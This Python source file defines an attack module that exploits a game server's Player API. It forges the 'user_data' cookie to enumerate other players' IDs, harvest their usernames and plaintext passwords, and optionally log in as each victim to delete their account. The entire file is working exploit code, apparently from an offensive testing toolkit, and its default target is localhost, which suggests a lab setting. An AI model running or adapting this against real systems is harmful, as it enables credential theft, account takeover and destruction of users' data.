#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import hashlib
from os import urandom

class AtkGameCheatDumpCredentials(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.ua = utility.ua
        self.debug = debug
        self.description = "The module can be gather user credentials and then delete users if a Player API's bug was not fix yet."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkGameCheatDumpCredentials object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, num_str, delete=False, reverse=True):
        num = int(num_str)

        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}

        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()
            set_id = hashlib.sha256(urandom(10)).hexdigest()
            set_password = urandom(10).hex()
            nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
            set_nickname = "John" + "_" + nickname_token

            json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}  
            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
            target_url = "http://" + self.target + "/create"
            response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            print(f"userid: {set_id}")
            print(f"password: {set_password}")
            print(f"nick_name: {set_nickname}")
            print("-----create user-----")
            print("Status code:   %i" % response1.status_code)
            print("Response body: %s" % response1.text)

            json_data = { "user_name": set_id, "password": set_password} 
            target_url = "http://" + self.target + "/login"
            response2 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----login-----")
            print("Status code:   %i" % response2.status_code)
            print("Response body: %s" % response2.text)


            #=======================================================================
            # get own player information
            #=======================================================================
            target_url = "http://" + self.target + "/player"
            response3 = session.get(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)
            player_info = json.loads(response3.text)
            id_max = player_info["id"]
            cookie_domain = session.cookies.list_domains()[0]
            if cookie_domain == None:
                cookie_domain = self.host
            
            count = 0
            sessions = {}
            for i in range(num):
                id = 0
                if reverse:
                    id = id_max - (i + 1)
                else:
                    id = (i + 2)
                if id > 0:
                    #=======================================================================
                    # Send dump credential request
                    #=======================================================================
                    session.cookies.set('user_data', str(id), domain=cookie_domain, path='/')
                    target_url = "http://" + self.target + "/player"
                    response4 = session.get(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)
                    player_info = json.loads(response4.text)

                    print(f"-----dump player credential / id_max {id_max}-----")
                    print("Response body: %s" % response4.text)

                    if player_info != None and player_info["result"].lower() != "ng" and player_info["id"] != id_max:
                        del_user_name = player_info["user_name"]
                        del_password = player_info["password"]
                        self.logger(f"id:{del_user_name}, pass:{del_password}", "+")
                        count += 1
                        
                        if delete:
                            #=======================================================================
                            # Send delete user request
                            #=======================================================================
                            sessions[id] = requests.Session()
                            json_data = { "user_name": del_user_name, "password": del_password} 
                            target_url = "http://" + self.target + "/login"
                            tmp_res = sessions[id].post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

                            print("-----login-----")
                            print("Status code:   %i(id: %d)" % (tmp_res.status_code, id))
                            print("Response body: %s(id: %d)" % (tmp_res.text, id))

                            target_url = "http://" + self.target + "/delete_user"
                            tmp_res = sessions[id].post(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)

                            print("-----delete user-----")
                            print("Status code:   %i(id: %d)" % (tmp_res.status_code, id))
                            print("Response body: %s(id: %d)" % (tmp_res.text, id))
                            self.logger(f"Attack SUCCESS! id:{del_user_name}, pass:{del_password}", "+")

                    else:
                        self.logger("May be Attack failed?", "!")

                    print('-'*8)
                else:
                    break
                
            self.logger(f"{count} user(s) found", "+")
            self.logger("Attack Finished!", "+")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)
        except Exception as e:
            print(e)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)


